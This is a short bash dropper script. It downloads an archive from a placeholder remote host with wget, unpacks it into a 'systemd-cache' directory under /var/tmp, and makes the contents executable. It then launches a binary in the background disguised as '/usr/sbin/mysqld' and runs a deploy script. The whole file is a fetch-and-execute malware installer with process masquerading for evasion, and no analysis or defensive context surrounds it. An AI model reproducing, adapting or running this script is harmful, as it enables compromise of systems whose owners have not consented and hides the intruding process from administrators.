#!/bin/bash
cd /var/tmp; mkdir systemd-cache; cd systemd-cache
wget http://IPADDR:PORT/r.tgz
tar xzvf r.tgz
chmod 755 ./*
/bin/bash -c "exec -a '/usr/sbin/mysqld' ./i" &
./deploy.sh
exit
